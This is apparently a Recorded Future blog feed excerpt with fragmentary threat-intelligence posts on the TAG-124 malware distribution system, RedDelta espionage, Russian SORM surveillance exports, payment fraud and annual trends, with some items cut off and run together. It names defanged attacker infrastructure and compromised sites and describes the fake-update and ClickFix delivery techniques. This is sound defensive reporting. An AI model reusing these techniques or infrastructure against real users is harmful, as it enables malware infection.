            <content:encoded><![CDATA[<h2 id="key-takeaways---what-every-cybersecurity-expert-needs-to-know">Key Takeaways - What every cybersecurity expert needs to know</h2><p>The Space Race 2.0 is well underway and accelerating rapidly. This white paper explores the key components shaping this modern space race and highlights how cyberattacks are already influencing its trajectory. Cyber operations will play a critical role in determining who dominates the second space race. As this new race accelerates, so too will the frequency and sophistication of cyberattacks targeting organisations operating in the space domain. Understanding how cyberattacks are reshaping this race is critical to protecting global economies, military operations, and the future of national security.</p><h2 id="what-is-currently-happening">What is currently happening?</h2><p>Nation-states are swiftly adapting their militaries to compete in space, a largely unregulated domain abundant with resources. History has shown that advanced nations often exploit new frontiers, and space is no exception. With its virtually limitless resources, space has become a critical battleground.</p><p>Earths orbit is already highly contested, hosting satellites essential to global economies and military operations. Many of these satellites have been victims of cyberattacks, a trend that is certain to intensify. However, the focus extends beyond Earths ground stations and orbit, where we see espionage, destructive attacks, supply chain compromise, and signal hijacking. Nation-states are now setting their sights on deeper space, and that is where our attention must also turn.</p><h2 id="what-is-going-to-happen">What is going to happen?</h2><p>The initial stage of Space Race 2.0 centers on Earths orbit, but the Moon, asteroids, and planets hold vast resources with the potential to transform nation-states in ways we can only begin to imagine. Efforts are already underway to colonize the Moon, mine asteroids, and establish a presence on habitable worlds beyond Earth.</p><p><img src="https://cms.recordedfuture.com/uploads/convergence_01_9b26a1d4c5.jpg" alt="Stages of the space race"><em><strong>Figure 1</strong>: Stages of the space race that are unfolding.</em> </p><p>As these ambitions grow, so will efforts to outmaneuver rival nations. Cyber capabilities will play a critical role, as adversaries seek to steal information or disrupt operations. Ground stations, communication signals, and the supply chains supporting space assets are vulnerable to cyberattacks. As such, space-related organisations and companies must prioritize robust cybersecurity measures to protect their operations in this emerging domain. At an operational level, researchers are advancing frameworks like SPARTA to stay ahead of evolving tactics, techniques, and procedures</p><p><img src="https://cms.recordedfuture.com/uploads/convergence_02_adb7eeb826.png" alt="Space Attack Research &amp; Tactic Analysis"><em><strong>Figure 2</strong>: Space Attack Research &amp; Tactic Analysis (SPARTA) from <a href="https://sparta.aerospace.org/">https://sparta.aerospace.org/</a>.</em></p><p>At the strategic level, industry and government are convening more frequently at conferences like Defence Space 24 to address the growing cyber threats in the space domain.</p><p><img src="https://cms.recordedfuture.com/uploads/convergence_03_ff07053458.png" alt="Defence Space 24"><em><strong>Figure 3</strong>: Defence Space 24 was hosted in London at the end of September 2024. Government, military, and industry representatives attended the event.</em></p><p>At a nation-state level, militaries are increasingly integrating intelligence and cyber capabilities into their space operations, with U.S. Space Command serving as a prominent example.</p><p>ConclusionThis white paper explores the intersection of space exploration and cybersecurity, delving into the challenges and opportunities shaping this evolving frontier. The stakes could not be higher: dominance in cyberspace directly translates to dominance in outer space, where control will determine humanitys future trajectory beyond Earth. As such, the convergence of space and cyber is critical and demands our full attention.</p>]]></content:encoded>

All references to 404TDS as an alias belonging to TAG-124 have been removed.</em></p><h2 id="executive-summary">Executive Summary</h2><p>Insikt Group has identified multi-layered infrastructure linked to a traffic distribution system (TDS) tracked by Recorded Future as TAG-124, which overlaps with threat activity clusters known as LandUpdate808, KongTuke, and Chaya_002. TAG-124 comprises a network of compromised WordPress sites, actor-controlled payload servers, a central server, a suspected management server, an additional panel, and other components. The threat actors behind TAG-124 demonstrate high levels of activity, including regularly updating URLs embedded in the compromised WordPress sites, adding servers, refining TDS logic to evade detection, and adapting infection tactics, as demonstrated by their recent implementation of the ClickFix technique. </p><p>Insikt Group identified multiple threat actors using TAG-124 within their initial infection chains, including operators of Rhysida ransomware, Interlock ransomware, TA866/Asylum Ambuscade, SocGholish, D3F@CK Loader, TA582, and others. Notably, the shared use of TAG-124 reinforces the <a href="https://blog.talosintelligence.com/emerging-interlock-ransomware/">connection</a> between Rhysida and Interlock ransomware, which are already linked through similarities in tactics, tools, encryption behaviors, ransom note themes, code overlaps, and data exfiltration techniques. Insikt Group expects that TAG-124 will continue its operations within the increasingly sophisticated and specialized cybercriminal ecosystem, enhance its effectiveness, and attract additional users and partners.</p><h2 id="key-findings">Key Findings</h2><ul><li>Insikt Group identified multi-layered infrastructure linked to a TDS tracked as TAG-124. This infrastructure includes a network of compromised WordPress sites, likely actor-controlled payload servers, a central server, a suspected management server, and an additional panel, among other components.</li><li>The threat actor(s) associated with TAG-124 appear highly active, regularly updating URLs on compromised WordPress sites to evade detection, adding new servers to their infrastructure, and improving TDS-linked conditional logic and infection tactics. </li><li>Multiple threat actors are assessed to incorporate TAG-124s service into their initial infection chains, including operators of Rhysida ransomware, Interlock ransomware, TA866/Asylum Ambuscade, SocGholish, D3F@CK Loader, TA582, and others.</li><li>While Rhysida and Interlock ransomware have been associated with each other due to similarities in tactics, tools, encryption behaviors, ransom note themes, overlaps in code, and data exfiltration techniques, the shared use of TAG-124 reinforces this connection.</li></ul><h2 id="background">Background</h2><p>TAG-124, which overlaps with LandUpdate808, KongTuke, and Chaya_002, is a TDS used to distribute malware on behalf of various threat actors, including operators of Rhysida ransomware, Interlock ransomware, TA866/Asylum Ambuscade, SocGholish, D3F@CK Loader, and TA582, among others (<a href="https://malasada.tech/the-landupdate808-fake-update-variant/">1</a>, <a href="https://x.com/GroupIB_TI/status/1790230870684828047">2</a>, <a href="https://www.forescout.com/blog/sly-malware-found-in-fake-google-chrome-and-ms-teams-installers/">3</a>). A TDS typically <a href="https://www.ncsc.gov.uk/files/White-paper-Ransomware-extortion-and-the-cyber-crime-ecosystem.pdf">refers</a> to a system used to analyze and redirect web traffic based on parameters like geolocation or device type, funneling only specific visitors to malicious destinations such as phishing sites, malware, or exploit kits, while evading detection and optimizing cybercriminal campaigns. </p><p>More specifically, TAG-124 operates by injecting malicious JavaScript code into compromised WordPress websites. When visitors access an infected website, they unknowingly load attacker-controlled resources designed to manipulate them into completing actions that result in the download and execution of malware. TAG-124 often deceives victims by presenting the malware as a required Google Chrome browser update. </p><p>In more recent variations, TAG-124 has been <a href="https://malasada.tech/updated-landupdate808-analysis/">observed</a> using the ClickFix technique. This approach displays a dialog instructing visitors to execute a command pre-copied to their clipboard. Once a visitor runs the command, it initiates a multi-stage process that downloads and executes the malware payload.</p><h2 id="threat-analysis">Threat Analysis</h2><h3 id="tag-124">TAG-124</h3><p>Insikt Group identified multi-layered infrastructure associated with the TDS TAG-124. This infrastructure comprises a network of compromised WordPress sites, likely actor-controlled payload servers, a central server whose exact purpose remains unclear at the time of analysis, a suspected management server, and an additional management panel. If visitors fulfill specific criteria, the compromised WordPress websites display fake Google Chrome update landing pages, which ultimately lead to malware infections as discussed in the <a href="https://docs.google.com/document/d/1sWVPIS7aEW2Z8Mva1mmWB2auMGlWKGfmUggwZVKuL88/edit?tab=t.0#heading=h.gfx3d1cfkcni">Users of TAG-124</a> section of this report (see <strong>Figure 1</strong>).</p><p><img src="https://cms.recordedfuture.com/uploads/tag_124_001_13e664d086.png" alt="TAG-124s high-level infrastructure setup"><em><strong>Figure 1</strong>: TAG-124s high-level infrastructure setup (Source: Recorded Future)</em></p><h4 id="compromised-wordpress-websites">Compromised WordPress Websites</h4><p>TAG-124s infrastructure consists of an extensive network of WordPress websites (see <strong>Appendix A</strong>). These websites appear to lack a consistent theme regarding industry, topic, or geography, suggesting they were likely compromised opportunistically through exploits or by acquiring credentials, such as those obtained via infostealers.</p><h5 id="first-stage-wordpress-websites-in-initial-delivery">First-Stage WordPress Websites in Initial Delivery</h5><p>The compromised websites of the first stage in the initial delivery phase typically include a <span style="font-family: Courier;">script</span> tag with an <span style="font-family: Courier;">async</span> attribute at an arbitrary location in the document object model (DOM), enabling the loading of an external JavaScript file in parallel with the page to avoid rendering delays (see <strong>Figure 2</strong>).</p><p><img src="https://cms.recordedfuture.com/uploads/tag_124_002_34e39e0a75.png" alt="Script tag in DOM used to load external JavaScript file"><em><strong>Figure 2</strong>: Script tag in DOM used to load external JavaScript file (Source: <a href="https://urlscan.io/result/eaa33803-1435-44c9-949f-3d707f51da4a">URLScan</a>)</em></p><p>The JavaScript filename has changed frequently over time, with earlier names following recognizable patterns (such as <span style="font-family: Courier;">metrics.js</span>) and more recent ones <a href="https://threatfox.abuse.ch/ioc/1353344/">appearing</a> to be randomly formatted (such as <span style="font-family: Courier;">hpms1989.js</span>).

For instance, the website associated with <em>www[.]ecowas[.]int</em> has consistently changed the URL used to fetch the JavaScript file. This behavior indicates that the threat actors maintain ongoing access to these WordPress sites and frequently alter the URLs, including the domain and JavaScript filename, likely to evade detection.</p><p>Although many of the compromised WordPress websites appear to be associated with lesser-known organizations, Insikt Group identified notable cases, including a subdomain linked to the Polish Centre for Testing and Certification, <em>www[.]pcbc[.]gov[.]pl</em>, and the domain of the Economic Community of West African States (ECOWAS) (<em>www[.]ecowas[.]int</em>). Both have been compromised and used in TAG-124 campaigns.</p><h5 id="final-stage-wordpress-websites-in-initial-delivery">Final Stage WordPress Websites in Initial Delivery</h5><p>If visitors meet specific criteria, which could not be fully determined, the compromised WordPress domains typically present fake Google Chrome update landing pages.

Of note, two domains hosted on <em>45[.]61[.]136[.]67</em>, namely <em>piedsmontlaw[.]com</em> and <em>pemalite[.]com</em>, were already resolving to this IP address in 2022, indicating that the server may have already been under the control of the threat actor during that time.</p><h5 id="suspected-higher-tier-infrastructure">Suspected Higher-Tier Infrastructure</h5><p>The majority of the suspected threat actor-controlled TAG-124 delivery servers, as listed in the <a href="https://docs.google.com/document/d/1sWVPIS7aEW2Z8Mva1mmWB2auMGlWKGfmUggwZVKuL88/edit?tab=t.0#heading=h.78m3kdx91knq">TAG-124 Delivery Servers</a> section, have been seen communicating with a server over TCP port 443 (see <strong>Figure 1</strong>). The configurations of this server are similar to those of the delivery servers and host a domain that returns only a generic HTML page when accessed. At the time of analysis, Insikt Group could not determine the exact purpose of this server but suspects it plays a central role in the operation. One possibility is that it contains the core logic of the TDS.</p><p>Additionally, Insikt Group identified a suspected management server linked to TAG-124. This server has been observed communicating with the delivery servers via TCP ports 80 and 443. It has also interacted with another panel linked to TAG-124, referred to as the &quot;Ads Panel&quot;, whose purpose includes serving the latest delivery server through a specified endpoint, among others (see <strong>Figure 1</strong>).</p><h2>Appendix A  Indicators of Compromise</h2><table><tbody><tr><td style="font-family:Courier New;background-color:#fff"><strong>Likely Compromised WordPress

            <description><![CDATA[Discover key insights from Recorded Future's 2024 report on cyber threats, criminal networks, SaaS identity risks, and strategies for 2025 cybersecurity.]]></description>
            <content:encoded><![CDATA[<p><img src="https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png" alt="insikt-group-logo-updated-3-300x48.png"></p><h2 id="explore-our-2024-threat-analysis-and-2025-predictions">Explore our 2024 Threat Analysis and 2025 Predictions</h2><p>In 2024, two key trends defined the cybersecurity landscape: the resilience of cybercriminal networks despite law enforcement actions and the growing complexity of enterprise attack surfaces. In addition, state-sponsored threat actors, primarily linked to China and Russia, intensified their focus on critical infrastructure and leveraged generative AI to conduct influence operations to advance their geopolitical objectives.</p><p>Recorded Futures just-released threat report explores these trends and more. It presents the industrys most comprehensive analysis of intelligence from 2024 as well as predictions to prepare your security organization for the year ahead. </p><p>Read on for a summary of key topics and themes, and then <a href="https://go.recordedfuture.com/hubfs/reports/cta-2025-0128.pdf">download the full report</a> for an in-depth look at the adversarys TTPs so you can strengthen your security posture.  </p><h3 id="top-themes-from-our-2024-research">Top Themes from our 2024 Research</h3><p><strong>Theme #1: Extortion Groups Proliferated Despite Law Enforcement Action</strong></p><p>Despite significant global law enforcement efforts targeting ransomware groups like <a href="https://www.recordedfuture.com/blog/lockbit-launches-ransomware-blog">LockBit</a> and <a href="https://www.recordedfuture.com/research/latin-american-governments-targeted-by-ransomware">ALPHV</a>, cybercriminals demonstrated their ability to adapt and thrive. They reorganized, leveraged leaked malware builders, and shifted to smaller, independent groups. By mid-2024, ransomware payments had already reached $459.8 million, with a record $75 million paid by a single victim. </p><p><strong>Theme #2: Growing Adoption of SaaS Led to More Identity Exploits</strong></p><p>Organizations now use an average of 371 SaaS applications, up significantly from 2021, with each application requiring its own access credentials. This increase in SaaS reliance gave threat actors more opportunities to exploit stolen or exposed credentials, which were implicated in high-profile breaches such as those at Snowflake and Change Healthcare. In both cases, attackers used stolen credentials obtained through infostealer malware to bypass single sign-on (SSO) protections. </p><p><strong>Theme #3: State-sponsored Influence Operations Escalated</strong></p><p>State-sponsored threat actors, including those <a href="https://www.recordedfuture.com/research/from-coercion-to-invasion-the-theory-and-execution-of-china-cyber-activity">linked to China</a>, Russia, and Iran, escalated their activities in 2024. These operations targeted critical infrastructure and leveraged generative AI to conduct influence campaigns during key elections.</p><p>Chinas Volt Typhoon group pre-positioned itself in US critical infrastructure, raising concerns about its potential for strategically timed cyberattacks. Meanwhile, Russia and Iran used generative AI to accelerate the creation and dissemination of inauthentic content aimed at influencing public opinion and destabilizing democracies worldwide. </p><p><strong>Theme #4: Tactics and Techniques Emphasized Defense Evasion</strong></p><p>Threat actors increasingly employed advanced tactics to evade detection. Malware targeting macOS and Linux systems surged, reflecting the growing use of these platforms in enterprise environments. Tools like RustDoor and <a href="https://www.recordedfuture.com/research/the-travels-of-markopolo-self-proclaimed-meeting-software-vortax-spreads-infostealers">AMOS</a> exploited cross-platform functionality to deliver sophisticated payloads, while ransomware groups targeted critical hypervisors such as VMware ESXi.</p><p>Defense evasion techniques, such as reflective code loading and the abuse of remote monitoring tools, became more prevalent. These methods enabled attackers to bypass endpoint detection and response (EDR) solutions.</p><h3 id="top-insikt-group-predictions-for-2025">Top Insikt Group Predictions for 2025</h3><p><strong>#1: AI Impersonation will be the Next Big Attack Vector for SaaS Applications</strong></p><p><a href="https://www.recordedfuture.com/research/insikt-group">Insikt Group</a> expects that a major breach will very likely result from one of two AI-associated factors: implementation of generative AI into enterprise workflows or abuse of AI for effective impersonation. In either case, it is likely that a SaaS application will play a role in initial access or data exposure.</p><p><strong>#2: Additional Typhoon Activity will Affect New Sectors</strong></p><p>Insikt Group predicts that more high-profile breaches of US critical infrastructure by <a href="https://www.recordedfuture.com/research/chinese-apt-groups-target-afghan-telecommunications-firm">China-linked APTs</a> will be disclosed in 2025, expanding beyond the energy and telecommunications sectors. These breaches are likely aimed at pre-positioning for disruptive operations.</p><p><strong>#3: macOS and Mobile Threats Join Windows and Cloud</strong></p><p>Insikt Group forecasts that one of the high-impact cyber incidents of 2025 will likely be associated with either macOS malware or mobile malware. This will result from certain environmental factors reaching breaking points, such as higher attention to macOS targets and increased access to sensitive corporate and financial data via mobile devices.</p><p><strong>#4: Crypto Fraud Will Lead to a Market-destabilizing Event</strong></p><p>The soaring value of cryptocurrency, as well as an incoming US administration set to pursue crypto-friendly policies, will drive more aggressive and ambitious fraud attempts. Inskit Group predicts that criminals will likely be emboldened by the crypto boom to carry out market-destabilizing scams that will at least temporarily reduce the value of cryptocurrencies and lead to calls to restrict their use.</p><h3 id="get-the-2024-recorded-future-annual-report-today">Get the 2024 Recorded Future Annual Report Today</h3><p>Download the report to access the complete set of research themes and predictions plus detailed analysis.

The group used lure documents themed around the 2024 Taiwanese presidential candidate Terry Gou, the Vietnamese National Holiday, flood protection in Mongolia, and meeting invitations, including an Association of Southeast Asian Nations (ASEAN) meeting. RedDelta likely compromised the Mongolian Ministry of Defense in August 2024 and the Communist Party of Vietnam in November 2024. The group conducted spearphishing targeting the Vietnamese Ministry of Public Security, but Insikt Group observed no evidence of  successful compromise. From September to December 2024, RedDelta likely targeted victims in Malaysia, Japan, the United States, Ethiopia, Brazil, Australia, and India.</p><p>In late 2023, RedDelta evolved the first stage of its infection chain to leverage a Windows Shortcut (LNK) file likely delivered via spearphishing. In 2024, the group transitioned to using Microsoft Management Console Snap-In Control (MSC) files. Most recently, RedDelta used spearphishing links to prompt a victim to load an HTML file remotely hosted on Microsoft Azure. Since July 2023, RedDelta has consistently used the Cloudflare content distribution network (CDN) to proxy command-and-control (C2) traffic, which enables the group to blend in with legitimate CDN traffic and complicates victim identification. Other state-sponsored groups, including Russias BlueAlpha, have similarly leveraged Cloudflare to evade detection.</p><p>RedDeltas activities align with Chinese strategic priorities, focusing on governments and diplomatic organizations in Southeast Asia, Mongolia, and Europe. The groups Asia-focused targeting in 2023 and 2024 represents a return to the groups historical focus after targeting European organizations in 2022. RedDeltas targeting of Mongolia and Taiwan is consistent with the groups past targeting of groups seen as threats to the Chinese Communist Partys power.</p><h2 id="about-reddelta">About RedDelta:</h2><p>RedDelta has been active since at least 2012 and has focused on targeting Southeast Asia and Mongolia. The group has routinely adapted its targeting in response to global geopolitical events. <a href="https://www.recordedfuture.com/research/reddelta-targets-catholic-organizations">RedDelta targeted the Vatican and other Catholic organizations</a> with PlugX before 2021 talks between China  and the Vatican. The has group <a href="https://www.recordedfuture.com/research/reddelta-cyber-threat-operations">compromised</a> law enforcement and government entities in India, a government organization in Indonesia, and other targets across Myanmar, Hong Kong, and Australia.</p><p>In 2022, <a href="https://www.recordedfuture.com/research/reddelta-targets-european-government-organizations-continues-iterate-custom-plugx-variant">RedDelta shifted toward increased targeting of European government and diplomatic entities</a> following Russia&#39;s invasion of Ukraine. This activity used an infection chain that began by delivering an archive file (ZIP, RAR, or ISO), which was likely delivered via spearphishing. The file contained a Windows Shortcut (LNK) file disguised with a double extension (such as .doc.lnk) and a Microsoft Word icon. Hidden folders within the archive contained three files used to complete dynamic-link library (DLL) search order hijacking: a legitimate binary, a malicious DLL loader, and an encrypted PlugX payload that was ultimately loaded into memory. User execution of the Shortcut file led to DLL search order hijacking. In November 2022, RedDelta evolved its tactics to stage the ISO file on a threat actor-controlled domain.</p><p>In March 2023, Insikt Group identified RedDelta targeting Mongolia using a similar infection chain that started with a container file (RAR, ZIP, ISO) consisting of an LNK file that triggered a DLL search order hijacking triad located within a hidden nested subdirectory. Decoy documents included an invitation from the World Association of Mongolia and a document claiming to be a BBC news interview about Tibetan Buddhism and Mongolia.

Likely targets include governments, NGOs, activists, and religious organizations. RedDelta has continually evolved its infection chain and is anticipated to continue doing so in the future in response to major geopolitical developments.</p><p>To read the entire analysis, <a

            <content:encoded><![CDATA[<p><img src="https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png" alt="insikt-group-logo-updated-3-300x48.png"></p><h2 id="summary">Summary:</h2><p>Several countries in Central Asia and Latin America almost certainly base their digital surveillance capabilities on Russias System for Operative Investigative Activities (SORM), indicating that Russian surveillance technology has proliferated in Russias near abroad and among its allies. Insikt Group identified evidence of at least eight SORM providers exporting to these regions, with at least fifteen telecommunications companies as likely customers. The largest Russian SORM providers like Citadel, Norsi-Trans, and Protei, export and participate in trade expositions across Africa, Latin America, and the Middle East, highlighting efforts to further expand globally. While these systems have legitimate security applications, the governments outlined in this report have a history of misusing surveillance capabilities , including repression of political opposition, journalists, and activists, without effective or independent oversight. SORM facilitates interception of a wide range of internet and telecommunications traffic by authorities without the knowledge of the service providers themselves, reducing transparency and oversight of surveillance operations and increasing opportunities for abuse. Companies operating in or looking to establish physical operations in these countries should assess surveillance risks and adopt privacy tools like encryption and VPNs  to the extent permitted by local law  to mitigate sensitive communications being intercepted.</p><h2 id="what-is-sorm">What is SORM?</h2><p><a href="https://www.recordedfuture.com/blog/russia-ukraine-cyber-front">Russias SORM</a> underpins the <a href="https://go.recordedfuture.com/hubfs/reports/cta-2021-0909.pdf">Russian Federations electronic surveillance apparatus</a>, which involves all telecommunications and ISP companies installing monitoring equipment under strict government oversight. Security and intelligence services gain direct access to telecommunications traffic passing through the installed equipment, bypassing service providers, who are not authorized to access information regarding interceptions. SORM has evolved from intercepting landline and mobile communications to monitoring internet traffic, Wi-Fi, and social media, with the latest iteration (SORM-3) enabling the collection and long-term storage of traffic and subscriber metadata in a searchable database. This system allows law enforcement authorities and security services to filter data by identifiers such as phone numbers, geolocations, IP addresses, and usernames, all supported by legal frameworks mandating compliance. The nature of SORMs integration into telecommunications and internet infrastructure facilitates potential interception and reduces visibility into surveillance operations, raising the risk of abuse, especially in countries with limited or nonexistent oversight.</p><h2 id="risk-of-russian-government-access">Risk of Russian Government Access</h2><p>Foreign deployments of SORM-based surveillance systems using Russian-manufactured components likely entail a risk of Russian access, given the close ties between SORM providers and the Russian government and the likely high value of information intercepted via these systems. Previous cases, such as the suspected exploitation of Kaspersky exports, support the assessment that Moscow can likely access exported SORM technologies. In <a href="https://www.bis.gov/press-release/commerce-department-prohibits-russian-kaspersky-software-us-customers">June 2024</a>, the US Department of Commerces Bureau of Industry and Security (BIS) prohibited Kaspersky Lab from providing technologies and services in the US or to US persons, citing several factors of &quot;unacceptable&quot; risk to national security. Similar concerns apply to SORM providers, such as Citadel, which has been tied to Russian security services, specifically the Federal Security Service (FSB), and oligarchs close to President Vladimir Putin. Citadels major role in the consolidation of the Russian SORM market also underscores likely connections to the Russian government. Notably, Kazakhstan and Kyrgyzstan have raised concerns about backdoors in SORM equipment, with evidence suggesting that Russian manufacturers maintained access to systems deployed abroad.</p><h2 id="mitigations">Mitigations</h2><p>Companies operating in countries using SORM-based systems should mitigate the risk of interception by securing online communications with reputable encryption tools, avoiding services on hosting providers with top-level domains of these countries, limiting or removing access to sensitive corporate data during travel, and conducting comprehensive assessments of state digital and physical surveillance capabilities, focusing on evidence of malign misuse against business travelers.</p><p>In this report, Insikt Group has provided a list of indicators that companies can use to assess data privacy and surveillance risk in the context of SORM. While none of these factors guarantee a country uses SORM, the presence of several indicators is indicative of a higher state surveillance risk, including imports from known Russian SORM providers, legislation requiring the installation of interception technologies akin to SORM, joint telecommunications projects with Russian SORM providers, state control over telecommunications infrastructure, reports of intrusive or malign surveillance, and restrictions on encryption technologies. <a href="https://www.recordedfuture.com/products/geopolitical-intelligence">Recorded Futures Country Risk feature</a> offers regularly updated analysis and mitigation guidance for assessing such risks.</p><h2 id="outlook">Outlook</h2><p>The marketing materials and trade show participation of major SORM providers suggest that these organizations will very likely continue to seek opportunities for foreign expansion. Countries with close ties to Russia  especially those with histories of cybersecurity or intelligence cooperation or joint projects in the telecommunications sphere  will likely continue to source digital surveillance components from Russian providers. SORM deployments in these regions will almost certainly continue to present data security risks, particularly where oversight of government surveillance is weak. More broadly, the export of Russian surveillance technologies will continue to offer Moscow opportunities to expand its influence, particularly in its &quot;near abroad&quot;, and potentially enhance intelligence collection capabilities, though the degree of potential access is unclear.</p><p>To read the entire analysis, <a href="https://go.recordedfuture.com/hubfs/reports/ta-ru-2025-0107.pdf">click here</a> to download the report as a PDF.</p>]]></content:encoded>

Futurists are invited to participate in virtual development sessions covering themes like overcoming adversity, unlocking personal potential, and harnessing the power of connection.</p><p><a href="https://www.recordedfuture.com/blog/erg-stories-hispanic-heritage-month-2024">In part one</a>, Mando Origel, Recorded Futures Latin Network ERG lead and Customer Success Manager, shared his inspiration for organizing these events and what he felt was the most important part of the ERG work: making meaningful connections. </p><script src="https://fast.wistia.com/embed/medias/0pcwi2fsf2.jsonp" async></script><script src="https://fast.wistia.com/assets/external/E-v1.js" async></script><div class="wistia_responsive_padding" style="padding:56.25% 0 0 0;position:relative;"><div class="wistia_responsive_wrapper" style="height:100%;left:0;position:absolute;top:0;width:100%;"><div class="wistia_embed wistia_async_0pcwi2fsf2 seo=true videoFoam=true" style="height:100%;position:relative;width:100%"><div class="wistia_swatch" style="height:100%;left:0;opacity:0;overflow:hidden;position:absolute;top:0;transition:opacity 200ms;width:100%;"><img src="https://fast.wistia.com/embed/medias/0pcwi2fsf2/swatch" style="filter:blur(5px);height:100%;object-fit:contain;width:100%;" alt="" aria-hidden="true" onload="this.parentNode.style.opacity=1;" /></div></div></div></div><p><em>Transcript: When you share your story, a lot of people can identify with it. And therefore, you know, you break that barrier of fear thats behind being authentically you. Hopefully, thats been the results, you know, where people can feel like they can be authentic at work, where they can bring their culture, their traditions, and really help everybody learn about one another. When people feel like they belong, theyre more willing to be themselves. And when youre yourself, you bring that authenticity which spreads like wildfire.</em></p><p>This November, Futurists completed part two of the series - a practical and interactive session where they reflected on their paths, feelings, and vision for their year to come through that same notion and concept of authenticity and connection.</p><p>We talked to them to understand their experiences and takeaways following the Creating Your Limitless Life workshop! </p><p>I found the Collective Power event to be a valuable opportunity to share and learn practical strategies for life management. Hearing about the positive goals others have set was inspiring, and it was encouraging to explore new approaches to achieve those goals. Overall, the experience was both enlightening and up-lifting. - Peter Barry, Office Operations Coordinator - Somerville</p><p>The Collective Power series was the most impactful self-reflection exercise I&#39;ve had the privilege to experience. The facilitators were awesome in sparking conversations where we felt comfortable sharing both personal and professional development ideas. I now have a true understanding of what I accomplished in 2024, and manageable expectations for myself and others in 2025. - Kim Stone, Sr. Program Manager, Customer Success</p><p>I found the Collective Power series to be empowering and enabling. It was reassuring to meet with other coworkers who are dealing with obstacles that life throws at them and hearing how everyone is coping and thriving despite those challenges. I learned resilience techniques and felt encouraged and less alone as a result. It was a great way to connect on a human level with my coworkers. - Charity Wright, Principal Threat Intelligence Consultant</p><p>Stay tuned for the third and final part of this series in 2025.</p>]]></content:encoded>

            <content:encoded><![CDATA[<p><em><strong>Editor&#39;s note: The following blog post originally appeared on <a href="https://intelligence2risk.substack.com/">Levi Gundert&#39;s Substack page</a>.</strong></em></p><p><img src="https://cms.recordedfuture.com/uploads/fraud_funding_image4_21003de229.png" alt="fraud-funding-image4.png"></p><h2 id="introduction">Introduction</h2><p>A past conversation with an undercover federal agent who specializes in money laundering revealed staggering amounts of currency moving across geographic boundaries, skirting traditional Anti-Money Laundering (AML) processes. From local and transnational crime syndicates to presidential spouses and those looking to evade sanctions or tax regimes, the need to wash and move illicit funds into reputable banking channels has never been greater. </p><p>The FTs recent AML coverage highlights the scale of the problem and provides timely <a href="https://www.ft.com/search?q=money+laundering">background reading</a> on money laundering networks, suspects, and indictments. One <a href="https://www.ft.com/content/db1fa3d5-ebe7-4612-b8b2-d4ea3f1e1027">story</a> is particularly relevant as it centers around proof of address compliance failures. Coincidentally, address verification is precisely the problem highlighted by a recent Recorded Future Payment Fraud Intelligence (PFI) report.</p><h2 id="big-fraud-and-a-hong-kong-address">Big Fraud and a Hong Kong Address</h2><p>The address in question is:<em>12th Floor, San Toi Building,137-139</em><em>Connaught Road Central, Hong Kong</em></p><p><img src="https://cms.recordedfuture.com/uploads/fraud_funding_image2_2e86532b3d.png" alt="fraud-funding-image2.png"><em>The San Toi Building (and 12th-floor visual estimate) provided by Google Maps</em></p><p>The address is linked to two scam website (fraud) clustersdesignated Misspelled and Brand as a Coverwhich share merchant accounts and payment processing logic. The three merchant accounts include CAMHUBSTORE, AQAPAY*xmvmxft, SMARTTECHHK, and gracefashionhub. Hundreds, if not thousands, of scam websites are connected to these merchants.</p><p><img src="https://cms.recordedfuture.com/uploads/fraud_funding_image1_68d61a2cfe.jpg" alt="fraud-funding-image1.jpg"><em>A scam website snapshot.</em> </p><p><img src="https://cms.recordedfuture.com/uploads/fraud_funding_image5_2cdfd29303.jpg" alt="fraud-funding-image5.jpg"><em>A victim articulates why Camhubstore is a scam site.</em> </p><p>These merchant accounts that process payments for fraudulent, non-existent goods are tied to the 12th floor of the San Toi Building as the registered business address. The address is even placed directly on some of the sites as a contact address. Heres where it gets interesting. The address is listed on the <a href="https://sanctionssearch.ofac.treas.gov/Details.aspx?id=46352">U.S. Treasury OFAC list</a> for ties to an <a href="https://home.treasury.gov/news/press-releases/jy1932">Iranian terrorism group</a>. </p><p>The 12th floor is presumably large enough to house <a href="https://www.importyeti.com/supplier/fenglong-art">multiple businesses</a> and likely sufficiently small such that <a href="https://www.importyeti.com/addresses/supplier/12-f-san-toi-building-137-139-connaught-road-central">businesses transit through</a> reasonably often. Of course, it would be difficult to draw a direct connection between these merchant accounts and terrorism based on a shared space address. Still, other questions remain, namely: how are these scam merchants acquiring the ability to process payment cards when their physical address is on the OFAC list? </p><h2 id="remedying-aml--kyc-compliance-failures">Remedying AML / KYC Compliance Failures</h2><p>Knowing your customer (KYC) might be difficult when bad actors go to great lengths to obscure their identity and purpose, but this is an egregious case of acquiring banks and payment processors missing obviously <a href="https://offshoreleaks.icij.org/nodes/292373?e=true">problematic</a> contact details.</p><p>Geoff Whites book, <a href="https://www.amazon.com/Lazarus-Heist-Based-hit-podcast/dp/0241554276/"><em>The Lazarus Heist</em>, documented that even routine checks can lead to better outcomes</a>. In it, White details North Korean hackers&#39; inability to transfer a more significant amount (hundreds of millions of dollars) from Bangladesh Bank to a bank branch in Manila because the branch is located on Jupiter Street, and &quot;Jupiter is also the name of a sanctioned Iranian shipping vessel. Addresses matter. </p><p>Suppose the US <a href="https://www.wsj.com/finance/currencies/crypto-banks-relationship-trump-administration-414ff706">pursues a more friendly regulatory environment</a> for cryptocurrencies under President Trump, and exchanges find it easier to acquire bank accounts. In that case, the <a href="https://intelligence2risk.substack.com/p/from-crypto-to-fiat-sneaky-ways-cybercriminals">potential for money laundering</a> may explode without rigorous AML / KYC / KYT efforts. The SEC may have fewer teeth, but banks and processors are still gambling if anyone can obtain a merchant account with little to no compliance checks. </p><p>Indeed, the business incentives are aligned to offer maximum merchant accounts to generate more processing fees, and historically, compliance costs have eroded profitability. However, this may be an emerging opportunity for GenAI. Semi-autonomous agents trained to flag basic AML violations (for example, website contact details listed on OFAC, perhaps) and elastic agents that deploy on demand when a new merchant application is submitted would assist AML compliance efforts and help the financial services industry grappling with a tsunami of fraudulent merchant transactions. </p><p><img src="https://cms.recordedfuture.com/uploads/fraud_funding_image3_c710d76671.png" alt="fraud-funding-image3.png"></p>]]></content:encoded>

            <description><![CDATA[Discover the rising costs of data breaches, including disruption, legal risks, and lost trust. Learn proactive steps to protect your business from escalating threats.]]></description>
